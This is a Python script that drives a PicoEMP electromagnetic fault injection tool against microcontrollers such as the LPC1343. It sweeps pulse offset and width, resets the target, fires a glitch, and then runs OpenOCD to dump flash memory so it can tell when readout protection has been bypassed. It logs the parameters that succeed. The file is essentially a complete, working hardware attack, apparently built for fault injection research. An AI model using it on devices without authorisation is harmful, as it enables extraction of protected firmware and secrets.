# Very interesting & Relevant Script:
# https://github.com/KULeuven-COSIC/SimpleLink-FI/blob/main/notebooks/5_ChipSHOUTER-PicoEMP.ipynb

import time
import os
import serial
from serial.tools import list_ports
from sciform import SciNum
from datetime import datetime

SERIAL_ACK_TIMEOUT = 5

# Define the initial minimum, maximum, and step values
offset_min_ns  = 1000
offset_max_ns  = 10000
offset_step_ns = 10
width_min_us   = 100
width_max_us   = 1000
width_step_us  = 10

class emfi():
    def __init__(self, _interface_option, _device_option, _reset_option, _off_min_ns = offset_min_ns, _off_max_ns = offset_max_ns, _off_step_ns = offset_step_ns, _wid_min_us = width_min_us, _wid_max_us = width_max_us, _wid_step_us = width_step_us):
        self.interface_option = _interface_option
        self.device_option = _device_option
        self.reset_option = _reset_option
        self.offset_min_ns  = _off_min_ns
        self.offset_max_ns  = _off_max_ns
        self.offset_step_ns = _off_step_ns
        self.width_min_us   = _wid_min_us
        self.width_max_us   = _wid_max_us
        self.width_step_us  = _wid_step_us

    def usleep(self, _micro_seconds):
        _micro_seconds = _micro_seconds / 1000000.0
        print(f"delay offset: {_micro_seconds}")
        time.sleep(_micro_seconds)
        # time.sleep(_micro_seconds/1000000.0)

    def nsleep(self, _nano_seconds):
        # _nano_seconds = _nano_seconds / 1000000000.0
        # # print(f'{SciNum(_nano_seconds):r}')
        # # # print(f"delay offset: {_nano_seconds}")
        # time.sleep(_nano_seconds)
        # # # time.sleep(_micro_seconds/1000000.0)

        # print(f'{SciNum(_nano_seconds):r}')
        # self.delay_nanos(_nano_seconds)
        start_time = time.time_ns()
        while (time.time_ns() - start_time) < _nano_seconds:
            pass

    def delay_nanos(self, nanos):
        start_time = time.time_ns()
        while (time.time_ns() - start_time) < nanos:
            pass

    def find_serial_port(self):
        """Find an available serial port."""
        ports = list_ports.comports()
        for port in ports:
            if port.device.startswith('/dev/ttyUSB') or port.device.startswith('/dev/ttyS')  or port.device.startswith('/dev/ttyACM'):
                return port.device
        return None
    
    def send_serial_data_with_noAcknowledge(self, _data, _serial_port):
        # data_to_send = _data
        # # d = b'' + data_to_send + '\r\n'
        # _serial_port.write(b'r\r\n')
        data_to_send = _data
        _serial_port.write((data_to_send + '\r\n').encode())
        print(f"Sent: {data_to_send}")
    def send_serial_data_with_acknowledge(self, _data, _serial_port):
        data_to_send = _data
        _serial_port.write((data_to_send + '\r\n').encode())
        print(f"Sent: {data_to_send}")
        if (data_to_send == 'a'):
            data_to_receive = 'Device armed!'
        elif (data_to_send == 'd'):
            data_to_receive = 'Device disarmed!'
        elif (data_to_send == 'p'):
            data_to_receive = 'Pulsed!'
        elif (data_to_send == 't'):
            data_to_receive = '[t] >'
        # elif (data_to_send == 'r'):
        #     data_to_receive = ''

        # Wait for acknowledgment
        if (data_to_send == 'p'):
            timeout = SERIAL_ACK_TIMEOUT * 1000
        else:
            timeout = SERIAL_ACK_TIMEOUT
        for i in range (0, timeout):
            ack = _serial_port.readline().strip().decode()
            # print('i=' + str(i) + ' - ack: ' + ack)
            if ack == data_to_receive:
                break
            else:
                continue
        if ack == data_to_receive:
            print("Acknowledgment received.")
        else:
            print("Acknowledgment not received or incorrect.")

    ## Function to reboot the Target MCU
    def reboot_flush(self, _reset_option):
        print('Reset target device.')
        if _reset_option == 'vdd':
            # emfi.target_pwr = False # Switch off the device
            self.emfi_target_vdd_rst_toggle() # Switch off the device - put logic low
            # Wait for the capacitors to be discharged
            # Delay Before Powering up the Target
            # time.sleep(0.1)
            self.emfi_arm() # emfi.arm()
            # emfi.target_pwr = True # Switch on the device
            self.emfi_target_vdd_rst_toggle() # Switch on the device - put logic high
        elif _reset_option == 'rst':
            # emfi.nrst = 'low'
            self.emfi_target_vdd_rst_toggle() # Switch off the device - put logic low
            # time.sleep(0.008)
            time.sleep(0.05)
            self.emfi_arm()
            # emfi.nrst = 'high_z'
            self.print_format_time_ns(time.time_ns())
            self.emfi_target_vdd_rst_toggle() # Switch on the device - put logic high

    def emfi_reset(self):
        self.send_serial_data_with_noAcknowledge('r', self.ser)

    def emfi_arm(self):
        self.send_serial_data_with_acknowledge('a', self.ser)

    def emfi_disarm(self):
        self.send_serial_data_with_acknowledge('d', self.ser)

    def emfi_pulse(self):
        # self.send_serial_data_with_acknowledge('p', self.ser)
        self.send_serial_data_with_noAcknowledge('p', self.ser)

    def emfi_target_vdd_rst_toggle(self):
        # self.send_serial_data_with_acknowledge('t', self.ser)
        self.send_serial_data_with_noAcknowledge('t', self.ser)

    def print_format_time_ns(self, ns):
        # Convert nanoseconds to seconds
        total_seconds = ns / 1e9
        
        # Compute hours, minutes, seconds, and nanoseconds
        hours, remainder = divmod(total_seconds, 3600)
        minutes, remainder = divmod(remainder, 60)
        seconds, nanoseconds = divmod(remainder, 1)
        nanoseconds = nanoseconds * 1e9
        # print(f"{hours} hours, {minutes} minutes, {seconds} seconds, {nanoseconds} nanoseconds")
        print(f"{int(hours)}:{int(minutes)}:{int(seconds)}.{int(nanoseconds)}")
        
        return int(hours), int(minutes), int(seconds), int(nanoseconds)

    def run(self):
        print('electromagnetic_fault_injection_run')

        is_picoemp_reset = 0

        # Find and initialize serial port with the picoEMP
        # Find an available serial port
        # PicoEMP_Check
        print('Searching for a connected PicoEMP')
        serial_found = 0
        # Check for a connected serial port for 1 second
        for i in range(0, 1000):
            serial_port = self.find_serial_port()
            if serial_port:
                serial_found = 1
                print(f"Found serial port: {serial_port}")
                break
            else:
                i = i + 1
                time.sleep(0.001)
                continue
        if (serial_found == 0):
            print("picoEMP is not connected.\nNo serial ports found.\nPLEASE CONNECT THE picoEMP TO THE SERIAL PORT AND TRY AGAIN.")
            exit()
        
        # Configure the serial port
        # self.ser = serial.Serial(serial_port, 9600, timeout=1)
        self.ser = serial.Serial(serial_port, 9600, timeout=0.0001)
        # self.ser = serial.Serial(serial_port, 9600, timeout=0.01)
        # Testing picoEMP serial interface
        # self.send_serial_data_with_acknowledge('a', ser)
        # time.sleep(0.01)
        # self.send_serial_data_with_acknowledge('p', ser)
        # time.sleep(0.01)
        # self.send_serial_data_with_acknowledge('d', ser)
        # time.sleep(0.01)
        # ser.close()
        # self.ser.write(b'\r\n')
        # time.sleep(0.1)
        # ret = self.ser.read(50)
        # if b'PicoEMP Commands' in ret:
        #     print('Connected to ChipSHOUTER PicoEMP!')
        # else:
        #     raise OSError('Could not connect to ChipShouter PicoEMP :(')

        # Reset the connected PicoEMP
        if (is_picoemp_reset == 0):
            self.emfi_reset()
            is_picoemp_reset = 1

        self.ser.flush()
        time.sleep(0.1)
        self.ser.close()
        self.ser = None
        time.sleep(2)

        # Reconnecting to the PicoEMP after reset
        print('Searching for a connected PicoEMP after RESET')
        serial_found = 0
        # Check for a connected serial port for 1 second
        for i in range(0, 1000):
            serial_port = self.find_serial_port()
            if serial_port:
                serial_found = 1
                print(f"Found serial port: {serial_port}")
                break
            else:
                i = i + 1
                time.sleep(0.001)
                continue
        if (serial_found == 0):
            print("picoEMP is not connected.\nNo serial ports found.\nPLEASE CONNECT THE picoEMP TO THE SERIAL PORT AND TRY AGAIN.")
            exit()
        
        
        self.ser = serial.Serial(serial_port, 9600, timeout=0.0001)

        
        time.sleep(0.1)
        self.ser.write(b'\r\n')
        time.sleep(0.1)
        ret = self.ser.read(50)
        if b'PicoEMP Commands' in ret:
            print('Connected to ChipSHOUTER PicoEMP!')
        else:
            raise OSError('Could not connect to ChipShouter PicoEMP :(')

        # Turn on the target device - initial value of gp1 is low (vdd: off | rst: on reset)
        print('Turn ON target Device.')
        # self.emfi_target_vdd_rst_toggle() # Switch on the device - put logic high

        # Create the lists using list comprehensions
        self.offset = [self.offset_min_ns + i * self.offset_step_ns for i in range((self.offset_max_ns - self.offset_min_ns) // self.offset_step_ns + 1)]
        self.width = [self.width_min_us + i * self.width_step_us for i in range((self.width_max_us - self.width_min_us) // self.width_step_us + 1)]

        # # Combine the lists into a dictionary
        # self.glitch_settings = {'offset': self.offset, 'width': self.width}
        # print(self.glitch_settings)

        fulllog_fn = 'logs/log-' + time.strftime("%Y%m%d-%H%M%S") + '.txt'
        for self.glitch_setting_offset_ns in self.offset:
            for self.glitch_setting_width_ns in self.width:
                # self.glitch_setting_offset = self.glitch_setting_offset
                # self.glitch_setting_width = self.glitch_setting_width
                print('offset: ' + str(self.glitch_setting_offset_ns) + ' | width: ' + str(self.glitch_setting_width_ns))
                timestr = time.strftime("%Y%m%d-%H%M%S")
                dumpfilename = 'logs/' + self.device_option + '_flashDump' + timestr + '.bin'
                if self.device_option == 'lpc1343':
                    openocd_str = 'openocd -f ./openocd/' + self.device_option + '_' + self.interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x0 0x8000;exit"'
                else:
                    openocd_str = 'openocd -f ./openocd/' + self.device_option + '_' + self.interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x0 0x80000;exit"'
                print('dumpfilename: ' + dumpfilename)
                print('openocd_str: ' + openocd_str)

                # Reboot the Target & arm the PicoEMP
                # 1. reset target
                self.reboot_flush(self.reset_option)
                # time.sleep(100)   # TESTING
                # 2. wait for offset time before glitch
                # time.sleep(self.glitch_setting_offset)
                # self.usleep(self.glitch_setting_offset)
                # print('Time in ns: ', time.time_ns())
                # print('Time in ns: ', datetime.strftime("%Y-%m-%d %H:%M:%S.%f"))
                # self.print_format_time_ns(time.time_ns())
                self.nsleep(self.glitch_setting_offset_ns)   # Available in python3.11
                # self.print_format_time_ns(time.time_ns())
                # time.sleep()
                # 3. Apply glitch attack with a suitable width
                self.emfi_pulse()
                # self.print_format_time_ns(time.time_ns())
                # mm
                # self.usleep(100)
                time.sleep(0.05)    # Delay after Glitch pulse - similar to cwLite voltage Glitch timings
                # 4. Check if debug interface is open (if attack was successful)
                exit_status = os.system(openocd_str)
                fulllog = open(fulllog_fn, 'a')
                fulllog.write(openocd_str + "\n")
                print(f"ext_offset: {self.glitch_setting_offset_ns}, width: {self.glitch_setting_width_ns}")
                print("exit_status: " + str(exit_status))
                print("*-----------------------------------*")
                if exit_status == 0:
                    print("SUCCESS")
                    filename = 'log-' + timestr + '.txt'
                    f = open(filename, 'a')
                    f.write(f"SUCCESS Paramters: width: {self.glitch_setting_width_ns}, offset: {self.glitch_setting_offset_ns}\n")
                    f.close()
                    fulllog.write(f"SUCCESS Paramters: width: {self.glitch_setting_width_ns}, offset: {self.glitch_setting_offset_ns}\n")
                    fulllog.close()
                    self.ser.close()
                    return
                    # break
                else:
                    os.system('rm ' + dumpfilename)
                # Reset the glitching module. Things break if you don't do this.
                time.sleep(0.01)
                # self.vglitch_reset(self.scope)

        self.ser.close()




